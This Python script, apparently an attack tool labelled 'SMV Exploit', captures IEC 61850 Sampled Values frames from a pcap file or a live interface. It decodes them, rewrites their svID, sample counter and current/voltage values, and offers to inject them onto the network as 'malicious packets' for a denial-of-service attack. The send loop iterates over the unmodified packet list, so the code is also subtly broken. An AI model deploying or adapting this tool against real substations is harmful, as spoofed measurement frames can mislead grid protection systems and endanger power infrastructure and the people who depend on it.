# Imports 
import os, sys, datetime, inspect, struct, time, argparse, pyshark
from time import sleep
import random
from scapy.layers.l2 import Ether, Dot1Q

# Imp Imports
from pyasn1.type import univ, char, namedtype, tag, constraint
from pyasn1.codec.ber import decoder, encoder
from scapy.all import *

# Local imports
from smv.sv import SV
from smv.sv_pdu import SavPDU, SeqASDU, ASDU, UtcTime, Data



### For debugging  ###
# from pyasn1 import debug
# debug.setLogger(debug.Debug('all'))


# network choice and filter
networkInterface = "eth1"
filter_string = "ether proto 0x88ba"
SV_TYPE = 0x88ba


# Tell the script where to find the the local modules
currentdir = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
parentdir = os.path.dirname(currentdir)
sys.path.insert(0, parentdir)


# Use argparse to parse the command line arguments
if len(sys.argv) < 2:
    print('[-] For help menu, use -h')
    sys.exit(1)

less_indent_formatter = lambda prog: argparse.RawTextHelpFormatter(prog, max_help_position=8)

parser = argparse.ArgumentParser(description='\t #################### \n \t ### SMV Exploit ### \n \t ####################  By S.M.', formatter_class=less_indent_formatter, usage='python3 %(prog)s [options]')
parser.add_argument('--pcapfile', help='Name of the PCAP file to process.')
parser.add_argument('--livecapture', action='store_true', help='Start the live capture. (default: %(default)s)')
parser.add_argument('--store', help=""" Name the file to store the captured packets (should be with .pcap extension).
Some Examples: 
----------
    python3 %(prog)s --livecapture --store <filename>     
    python3 %(prog)s --pcapfile  <filename>
    
""")

args = parser.parse_args()



####  DEFINED FUNCTIONS   ####


# CONVERTING THE TIME INTO 64-BITS or 8-BYTES FORM
UTC = 1 # 0: local time 1: UTC Time
def curTime64Bits(utc=False):
    # Microsecond Resolution Ignored
    if UTC:
        curTime = time.mktime(datetime.datetime.utcnow().timetuple())
    else:
        curTime = time.mktime(datetime.datetime.now().timetuple())

    curTimeInt = int(curTime)
    curTimeInt64 = (curTimeInt << 32)
    curTimeInt64Str = curTimeInt64.to_bytes(8,'big')
    return curTimeInt64Str


# Check for SV packets
def sv_check(pkt):
    is_sv = False
    if pkt.haslayer(Ether): 
        if pkt[Ether].type == SV_TYPE: is_sv = True
    if pkt.haslayer(Dot1Q):
        if pkt[Dot1Q].type == SV_TYPE: is_sv = True
    return is_sv


# Decode the packet
def decode_packet(encoded_data):
    
    savpdu = SavPDU().subtype(
        implicitTag = tag.Tag(
            tag.tagClassApplication,
            tag.tagFormatConstructed,
            0
        )
    )
    
    decoded_savpdu , rest_of_data = decoder.decode(
        encoded_data,
        asn1Spec=savpdu
    )
    
    return decoded_savpdu


# Filter packets based on the src and dst MAC addresses
def filter_packets(packet, src_mac, dst_mac):
    if packet.haslayer(Ether):
        if packet[Ether].src == src_mac and packet[Ether].dst == dst_mac:
            return True
    return False


def format_hex(n):
    num = int(n)
    
    # Convert the integer to hexadecimal and pad with zeros to ensure two digits
    formatted_hex = '0x' + hex(num)[2:].zfill(2)
    
    return formatted_hex



####  INTERACTIVE PART  #####


# Read the given pcap file
if args.pcapfile:
    packets = rdpcap(args.pcapfile)
    print("\n[+] Reading pcap file... "); sleep(1)


# Live capture the packets from a live network
if args.livecapture:
    try:
        print(f"[+] Listening on {networkInterface}"); sleep(1)
        print("[+] YOU SHOULD HAVE SUDO PERMISSIONS TO DO THIS")
        count = int(input('How many packets do you want to capture?: '))
        print("[+] Capturing packets...")
        captureLive = pyshark.LiveCapture(
                interface=networkInterface, 
                bpf_filter=filter_string,
                output_file=args.store
        )

        #captureLive.set_debug()
        captureLive.sniff(packet_count=count)
        captureLive.close()
        print("[+] Capturing done..")
        print("[+] Using the pcap file just captured..")
        packets = rdpcap(args.store)

    except KeyboardInterrupt:
        print('\n[-] Exiting')
        sys.exit(1)


print("[+] Filtering SV packets... "); sleep(1)
print("[+] Decoding the packets... "); sleep(1)




# Store Data
sv_packets = []                 #  to store the SV packets
unique_sv_packets = set()       #  to store the SV packets for specific src and dst MAC addresses


# Extract the SV packets
for packet in packets:
    if sv_check(packet):
        # Add only sv packets to the list
        sv_packets.append(packet)
        
        # Add unique source and destination addresses to the set
        unique_sv_packets.add((packet[Ether].src, packet[Ether].dst))



# Printing a sample packet

perm = input("Do you want to print a sample SV packet?[Y/N]: ")
sample = sv_packets[0]
try:
    if perm in ['y', 'Y']:
        print("[+] Printing the packet details...\n"); sleep(1)
        encoded_data = sample.load
        decoded_savpdu = decode_packet(encoded_data)
        print(decoded_savpdu.prettyPrint())
    elif perm in ['n','N']:
        print("Okay, nvm!\n")
    else:
        print('Invalid Input\n')

except KeyboardInterrupt:
    print('[-] Exiting')



#### FILTERING THE PACKETS #### 

# Convert set of unique addresses to a list and print it
unique_addresses_list = list(unique_sv_packets)

print("\n[+] Scaning for unique source-destination connections..."); sleep(1)
print("Unique source and destination MAC addresses:")
for i, (src, dst) in enumerate(unique_addresses_list):
    print(f"{i+1}. Source: {src} --> Destination: {dst}")
   
print('\n') 
print(f"Select the destination you want to target in the range [1 to {len(unique_addresses_list)}]: ")
target = int(input("Choose the index:  "))
print('\n') 
sleep(1)

if 1 <= target <= len(unique_addresses_list):   
    src, dst = unique_addresses_list[target-1]
    print(f"Selected source MAC address: {src}")
    print(f"Selected destination MAC address: {dst}")
    print('\n') 

else:
    print("Invalid input!")
    exit(1)
    
    
filtered_packets = [packet for packet in sv_packets if filter_packets(packet, src, dst)]



##########  MODIFYING THE PACKETS  ##########

#### Packets WORKFLOW :)  ####
#  args.pcapfile --> packets --> sv_packets  --> filtered_packets --> packets_to_modify
#                            |
#                            |--> unique_sv_packets --> unique_addresses_list --> src, dst



# SELECTING THE PACKETS TO BE MODIFIED
while True:
    try:
        n = int(input("How many packets do you want to manipulate: "))
        print(f"[+] Select the packets you want to manipulate in the range of 0 to {len(filtered_packets)}.")

        packet_nos = list(map(int, input("Enter multiple packet numbers separated by space: ").split()))
        
        if n != len(packet_nos):
            print(f"[-] Error: You selected {len(packet_nos)} packets but you specified {n}. Please try again.")
            continue
        
        break
    
    except ValueError:
        print("[-] Error: Please enter valid integer values.")
    
    except KeyboardInterrupt:
        print("[-] Exiting")
        break


packets_to_modify = [filtered_packets[i] for i in packet_nos]



## Manipulating the packets

mod_packets = []


for i, pkt in enumerate(packets_to_modify):
    
    ## Decoding the packet ##
    raw_data = pkt.load
    # print(pkt)
    # print(pkt.load)
    decoded_savpdu = decode_packet(raw_data)
    
    
    # Extracting the ASDU
    seq_asdu = decoded_savpdu.getComponentByPosition(1)  
    asdu = seq_asdu.getComponentByPosition(0)  
    
    svID = asdu.getComponentByPosition(0)
    smp_cnt = asdu.getComponentByPosition(1)  
    confRev = asdu.getComponentByPosition(2)
    smp_sync = asdu.getComponentByPosition(3)
    seq_data = asdu.getComponentByPosition(4)
    

    ### Modification logic  ###
       
    
    # ASKING FOR MODIFICATION OF SVID AND SMPCNT VALUES

    try:
        print(f'''What do you want to modify in packet {i} ? 
            1. Only svID 
            2. Only smpCnt
            3. Both 

            
            ''')
        mod_choice = int(input("Enter : ")) 
        print('\n')
        
        new_svID = None
        new_smpCnt = None
        
        if mod_choice == 1:
            new_svID = input("Enter svID value : ")
            asdu.setComponentByName('svID', new_svID)
            
        elif mod_choice == 2:
            new_smpCnt = int(input("Enter smpCnt value : "))
            asdu.setComponentByName('smpCnt', new_smpCnt)
            
        elif mod_choice == 3:
            new_svID = input("Enter svID value : ")
            new_smpCnt = int(input("Enter smpCnt value : "))
            asdu.setComponentByName('svID', new_svID)
            asdu.setComponentByName('smpCnt', new_smpCnt)
                        
                                                
        
    except KeyboardInterrupt:
        print('[-] Exiting')  
        
    seq_data = bytearray(seq_data)
    
    ### For Random change
    
    # for i in range(3):
    #     seq_data[i] = random.randint(0, 5)
    
    # formatted_hex = '0x' + hex(num)[2:].zfill(2)      # format 
          
          
    ### For Current change ####
    seq_data[0] = 0x00                          
    seq_data[1] = 0x01
    seq_data[2] = 0x02         
          
    #### For voltage change ###          

    seq_data[3] = 0x00                          
    seq_data[4] = 0x01
    seq_data[5] = 0x02
    
    ### Encoding the modified packet ###
    encoded_data = encoder.encode(decoded_savpdu)
    
    
    ## Packet formation ##
    
    
    # original packet data 
    
    # ether data 
    src = pkt.src
    dst = pkt.dst
    type = pkt.type
    
    
    
    # SV data
    Appid = pkt[SV].appid   
    Length = pkt[SV].length
    Reserved1 = pkt[SV].reserved1
    Reserved2 = pkt[SV].reserved2
    
    
 
 
    if pkt.haslayer(Dot1Q):
        if pkt[Dot1Q].type == SV_TYPE: 
            # Dot1Q data
            Prio = pkt[Dot1Q].prio
            Id = pkt[Dot1Q].id
            Vlan = pkt[Dot1Q].vlan
            Type = pkt[Dot1Q].type
            
            mod_packet = Ether(src=src, dst=dst, type=type)/Dot1Q(prio = Prio, id= Id, vlan=Vlan, type=Type)/SV(appid=Appid, length=Length, reserved1 = Reserved1,reserved2=Reserved2)/encoded_data
 
    else:
        mod_packet = Ether(src=src, dst=dst, type=type)/SV(appid=Appid, length=Length, reserved1 = Reserved1,reserved2=Reserved2)/encoded_data
 
    mod_packets.append(mod_packet)  


## PRINTING THE MODIFIED PACKETS ##
debug = input("Do you want to print the modified data?[Y/N]?: ")
if debug in ['y', 'Y']:
    for pkt, mod_packet in zip(packets_to_modify, mod_packets):
        print("\n### Original Packet Data ###")
        print(decode_packet(pkt.load).prettyPrint())
        print("\n### Modified Packet Data ###")
        print(decode_packet(mod_packet.load).prettyPrint())

elif debug in ['n', 'N']:
    print("[+] Moving on to the exploit..")



## SENDING/INJECTING OR SAVING THE MALICIOUS PACKETS ##
attack_choice = input("Do you want to send the modified packets? [Y/N]: ")
if attack_choice in ['y', 'Y']:
    try:
        # SENDING THE FRAMES AT HIGH FREQUENCY   ==> DOS ATTACK
        print('[+] Sending malicious packets...')

        for mod_packet in packets_to_modify:
            sendp(mod_packet, iface=networkInterface)
            # wrpcap("sv_dos.pcapng", mod_packet, append=True)
            sleep(0.01)
    except KeyboardInterrupt:
        print("[-] Stopping the injection...")

elif attack_choice in ['n', 'N']:
    save_choice = input("Do you want to save the modified packets to a file? [Y/N]: ")
    if save_choice in ['y', 'Y']:
        f_name = input("Set filename: ")
        f_name = f_name + ".pcapng"
        try:
            print('[+] Saving the modified packets in pcapng file..')
            for mod_packet in packets_to_modify:
                wrpcap(f_name, mod_packet, append=True)
                sleep(0.01)
            print(f"Successfully saved pcapng file as {f_name} !")
            print("\n\n")

        except KeyboardInterrupt:
            print("[-] Exiting!")
    else:
        print("No action taken on modified packets.")
        exit(0)
  
